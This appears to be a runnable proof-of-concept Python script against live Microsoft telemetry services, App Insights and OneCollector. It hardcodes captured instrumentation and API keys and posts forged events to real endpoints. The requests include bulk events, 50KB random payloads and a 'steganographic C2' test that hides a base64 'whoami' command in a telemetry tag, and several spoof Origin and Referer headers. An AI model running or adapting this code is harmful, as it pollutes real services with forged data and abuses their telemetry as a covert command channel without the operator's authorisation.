#!/usr/bin/env python3
"""
Microsoft Telemetry Checker

"""

import requests
import json
import time
import base64
import os
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# CONFIGURATION – APP INSIGHTS (VULN-193698)
# ============================================================================

# Confirmed App Insights instrumentation keys
AI_IKEYS = [
    "6a66a822-429e-49e0-951f-dbba255ac842",  # Power BI WFE
    "e3524ec5-ee88-4933-a91e-4d16e385ef93",  # TriShell
    "e43fee4d-90d5-4c2a-a681-cffdd604ad5c",  # Fabric Main App (Global)
    "433d8c1b-e63d-4935-8917-fbb39ecb7b51",  # Fabric TriShell
]

# Confirmed App Insights injection endpoints
AI_ENDPOINTS = [
    "eastus-0.in.applicationinsights.azure.com",
    "eastus-8.in.applicationinsights.azure.com",
]

# ============================================================================
# CONFIGURATION – ONECOLLECTOR (VULN-200045)
# ============================================================================

# Confirmed OneCollector API keys
OC_KEYS = [
    {
        "key": "69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293",
        "ikey": "69adc3c768bd4dc08c19416121249fcc",
        "origin": "login.microsoftonline.com (Azure AD)"
    },
    {
        "key": "d634483c08244c1ca09af2b2d952c92e-ab2bba03-2ba3-49d8-a82c-ef6da750d8ab-7725",
        "ikey": "d634483c08244c1ca09af2b2d952c92e",
        "origin": "portal.azure.com (Azure Portal)"
    }
]

# All 9 confirmed OneCollector endpoints
OC_ENDPOINTS = [
    "browser.events.data.microsoft.com",
    "vortex.data.microsoft.com",
    "self.events.data.microsoft.com",
    "v10.events.data.microsoft.com",
    "us-mobile.events.data.microsoft.com",
    "eu-mobile.events.data.microsoft.com",
    "uk-mobile.events.data.microsoft.com",
    "au-mobile.events.data.microsoft.com",
    "mobile.events.data.microsoft.com",
]

# ============================================================================
# TELEMETRY INJECTION FUNCTIONS
# ============================================================================

def timestamp():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

def timestamp_short():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def print_header(text):
    print("\n" + "=" * 70)
    print(f"  {text}")
    print("=" * 70)

def print_success(text):
    print(f"[+] {text}")

def print_fail(text):
    print(f"[-] {text}")

def print_info(text):
    print(f"[*] {text}")

# ----------------------------------------------------------------------------
# App Insights Injection (VULN-193698)
# ----------------------------------------------------------------------------

def ai_inject_basic(endpoint, ikey):
    """Basic App Insights injection test."""
    url = f"https://{endpoint}/v2.1/track"
    program = {
        "name": "Microsoft.ApplicationInsights.Event",
        "time": timestamp_short(),
        "iKey": ikey,
        "tags": {"ai.device.id": "poc-ai-basic"},
        "data": {
            "baseType": "EventData",
            "baseData": {"ver": 2, "name": "AIBasicTest"}
        }
    }
    try:
        r = requests.post(url, json=program, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return data.get("itemsAccepted", 0) == 1
        return False
    except Exception:
        return False

def ai_inject_bulk(endpoint, ikey, count=10):
    """Bulk App Insights injection test (10 events)."""
    success = 0
    for i in range(1, count + 1):
        url = f"https://{endpoint}/v2.1/track"
        program = {
            "name": "Microsoft.ApplicationInsights.Event",
            "time": timestamp_short(),
            "iKey": ikey,
            "tags": {"ai.device.id": f"poc-ai-bulk-{i}"},
            "data": {
                "baseType": "EventData",
                "baseData": {"ver": 2, "name": "AIBulkTest"}
            }
        }
        try:
            r = requests.post(url, json=program, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get("itemsAccepted", 0) == 1:
                    success += 1
        except Exception:
            pass
    return success == count

def ai_inject_large_program(endpoint, ikey):
    """Large program App Insights injection test (50KB)."""
    program_data = base64.b64encode(os.urandom(50000)).decode('ascii')
    url = f"https://{endpoint}/v2.1/track"
    program = {
        "name": "Microsoft.ApplicationInsights.Event",
        "time": timestamp_short(),
        "iKey": ikey,
        "tags": {"ai.device.id": "poc-ai-large"},
        "data": {
            "baseType": "EventData",
            "baseData": {
                "ver": 2,
                "name": "AILargeprogramTest",
                "properties": {"data": program_data}
            }
        }
    }
    try:
        r = requests.post(url, json=program, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get("itemsAccepted", 0) == 1
        return False
    except Exception:
        return False

def ai_inject_stego(endpoint, ikey):
    """Steganographic C2 test – command hidden in ai.application.ver."""
    cmd = base64.b64encode(b"whoami").decode('ascii')
    url = f"https://{endpoint}/v2.1/track"
    program = {
        "name": "Microsoft.ApplicationInsights.Event",
        "time": timestamp_short(),
        "iKey": ikey,
        "tags": {"ai.application.ver": cmd},
        "data": {
            "baseType": "EventData",
            "baseData": {"ver": 2, "name": "AIStegoTest"}
        }
    }
    try:
        r = requests.post(url, json=program, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return data.get("itemsAccepted", 0) == 1
        return False
    except Exception:
        return False

# ----------------------------------------------------------------------------
# OneCollector Injection (VULN-200045)
# ----------------------------------------------------------------------------

def oc_inject_basic(endpoint, key_data):
    """Basic OneCollector injection test."""
    url = f"https://{endpoint}/OneCollector/1.0/"
    params = {
        "cors": "true",
        "content-type": "application/x-json-stream",
        "client-id": "NO_AUTH",
        "client-version": "1DS-Web-JS-4.2.1",
        "apikey": key_data["key"],
        "upload-time": str(int(time.time() * 1000)),
        "time-delta-to-apply-millis": "0",
        "w": "2",
        "NoResponseBody": "true",
    }
    program = {
        "name": "BasicTest",
        "time": timestamp(),
        "ver": "4.0",
        "iKey": f"o:{key_data['ikey']}",
        "ext": {},
        "data": {},
    }
    headers = {
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": "https://portal.azure.com" if "portal" in key_data["origin"] else "https://login.microsoftonline.com",
        "Referer": "https://portal.azure.com/" if "portal" in key_data["origin"] else "https://login.microsoftonline.com/",
    }
    try:
        r = requests.post(url, params=params, json=program, headers=headers, timeout=10)
        return r.status_code == 204
    except Exception:
        return False

def oc_inject_bulk(endpoint, key_data, count=10):
    """Bulk OneCollector injection test (10 events)."""
    success = 0
    url = f"https://{endpoint}/OneCollector/1.0/"
    for i in range(1, count + 1):
        params = {
            "cors": "true",
            "content-type": "application/x-json-stream",
            "client-id": "NO_AUTH",
            "client-version": "1DS-Web-JS-4.2.1",
            "apikey": key_data["key"],
            "upload-time": str(int(time.time() * 1000)),
            "time-delta-to-apply-millis": "0",
            "w": "2",
            "NoResponseBody": "true",
        }
        program = {
            "name": f"BulkTest-{i}",
            "time": timestamp(),
            "ver": "4.0",
            "iKey": f"o:{key_data['ikey']}",
            "ext": {},
            "data": {},
        }
        headers = {
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://portal.azure.com" if "portal" in key_data["origin"] else "https://login.microsoftonline.com",
            "Referer": "https://portal.azure.com/" if "portal" in key_data["origin"] else "https://login.microsoftonline.com/",
        }
        try:
            r = requests.post(url, params=params, json=program, headers=headers, timeout=10)
            if r.status_code == 204:
                success += 1
        except Exception:
            pass
    return success == count

def oc_inject_large_program(endpoint, key_data):
    """Large program OneCollector injection test (50KB)."""
    program_data = base64.b64encode(os.urandom(50000)).decode('ascii')
    url = f"https://{endpoint}/OneCollector/1.0/"
    params = {
        "cors": "true",
        "content-type": "application/x-json-stream",
        "client-id": "NO_AUTH",
        "client-version": "1DS-Web-JS-4.2.1",
        "apikey": key_data["key"],
        "upload-time": str(int(time.time() * 1000)),
        "time-delta-to-apply-millis": "0",
        "w": "2",
        "NoResponseBody": "true",
    }
    program = {
        "name": "LargeprogramTest",
        "time": timestamp(),
        "ver": "4.0",
        "iKey": f"o:{key_data['ikey']}",
        "data": {
            "baseData": {
                "properties": {"program": program_data}
            }
        }
    }
    headers = {
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": "https://portal.azure.com" if "portal" in key_data["origin"] else "https://login.microsoftonline.com",
        "Referer": "https://portal.azure.com/" if "portal" in key_data["origin"] else "https://login.microsoftonline.com/",
    }
    try:
        r = requests.post(url, params=params, json=program, headers=headers, timeout=15)
        return r.status_code == 204
    except Exception:
        return False

def oc_inject_stego(endpoint, key_data):
    """Steganographic C2 test – command hidden in ai.application.ver."""
    cmd = base64.b64encode(b"whoami").decode('ascii')
    url = f"https://{endpoint}/OneCollector/1.0/"
    params = {
        "cors": "true",
        "content-type": "application/x-json-stream",
        "client-id": "NO_AUTH",
        "client-version": "1DS-Web-JS-4.2.1",
        "apikey": key_data["key"],
        "upload-time": str(int(time.time() * 1000)),
        "time-delta-to-apply-millis": "0",
        "w": "2",
        "NoResponseBody": "true",
    }
    program = {
        "name": "StegoTest",
        "time": timestamp(),
        "ver": "4.0",
        "iKey": f"o:{key_data['ikey']}",
        "tags": {"ai.application.ver": cmd},
        "ext": {},
        "data": {},
    }
    headers = {
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": "https://portal.azure.com" if "portal" in key_data["origin"] else "https://login.microsoftonline.com",
        "Referer": "https://portal.azure.com/" if "portal" in key_data["origin"] else "https://login.microsoftonline.com/",
    }
    try:
        r = requests.post(url, params=params, json=program, headers=headers, timeout=10)
        return r.status_code == 204
    except Exception:
        return False

# ============================================================================
# TEST FUNCTIONS
# ============================================================================

def test_app_insights():
    """Run all App Insights injection tests."""
    print_header("APP INSIGHTS (VULN-193698)")

    results = []
    for endpoint in AI_ENDPOINTS:
        print_info(f"Testing endpoint: {endpoint}")
        for ikey in AI_IKEYS:
            tests = [
                ("Basic", ai_inject_basic),
                ("Bulk (10/10)", ai_inject_bulk),
                ("Large program (50KB)", ai_inject_large_program),
                ("Steganographic C2", ai_inject_stego),
            ]
            key_success = True
            for test_name, test_func in tests:
                result = test_func(endpoint, ikey)
                status = "[+] PASS" if result else "[-] FAIL"
                print(f"    {test_name:20} with {ikey[:8]}...: {status}")
                if not result:
                    key_success = False
            if key_success:
                print_success(f"  All tests passed for {endpoint} with {ikey[:8]}...")
                results.append({"endpoint": endpoint, "ikey": ikey, "success": True})
                break
        else:
            print_fail(f"  No working key found for {endpoint}")
            results.append({"endpoint": endpoint, "success": False})
        print()

    return results

def test_onecollector():
    """Run all OneCollector injection tests."""
    print_header("ONECOLLECTOR (VULN-200045)")

    results = []
    for key_data in OC_KEYS:
        print_info(f"Testing key from: {key_data['origin']}")
        print_info(f"  Key: {key_data['key'][:40]}...")
        for endpoint in OC_ENDPOINTS:
            tests = [
                ("Basic", oc_inject_basic),
                ("Bulk (10/10)", oc_inject_bulk),
                ("Large program (50KB)", oc_inject_large_program),
                ("Steganographic C2", oc_inject_stego),
            ]
            all_passed = True
            for test_name, test_func in tests:
                result = test_func(endpoint, key_data)
                status = "[+] PASS" if result else "[-] FAIL"
                print(f"    {test_name:20} on {endpoint}: {status}")
                if not result:
                    all_passed = False
            if all_passed:
                print_success(f"  All tests passed for {endpoint}")
                results.append({"endpoint": endpoint, "key_origin": key_data["origin"], "success": True})
            else:
                print_fail(f"  Some tests failed for {endpoint}")
        print()

    return results

# ============================================================================
# SUMMARY
# ============================================================================

def print_summary(ai_results, oc_results):
    print_header("EXECUTIVE SUMMARY")

    print_info("APP INSIGHTS (VULN-193698)")
    ai_passed = sum(1 for r in ai_results if r.get("success", False))
    ai_total = len(ai_results)
    if ai_passed > 0:
        print_success(f"  {ai_passed}/{ai_total} endpoints vulnerable")
        for r in ai_results:
            if r.get("success", False):
                print(f"    - {r['endpoint']} with {r['ikey'][:8]}...")
    else:
        print_fail("  No vulnerable endpoints found")

    print()
    print_info("ONECOLLECTOR (VULN-200045)")
    oc_passed = sum(1 for r in oc_results if r.get("success", False))
    oc_total = len(oc_results)
    if oc_passed > 0:
        print_success(f"  {oc_passed}/{oc_total} endpoint-key combinations successful")
        # Count unique endpoints
        unique_endpoints = set(r["endpoint"] for r in oc_results if r.get("success", False))
        print(f"    - {len(unique_endpoints)} unique endpoints confirmed vulnerable")
        for ep in sorted(unique_endpoints):
            print(f"      - {ep}")
    else:
        print_fail("  No vulnerable endpoints found")

    print()
    print_info("TOTAL CONFIRMED VULNERABLE ENDPOINTS")
    total = ai_passed + len(unique_endpoints) if oc_passed > 0 else ai_passed
    print_success(f"  {total} endpoints confirmed vulnerable across both zero-days")


# ============================================================================
# MAIN
# ============================================================================

def main():
   

    print_info("Starting App Insights tests...")
    ai_results = test_app_insights()

    print_info("Starting OneCollector tests...")
    oc_results = test_onecollector()

    print_summary(ai_results, oc_results)

    print_header("PoC COMPLETE")

if __name__ == "__main__":
    main()

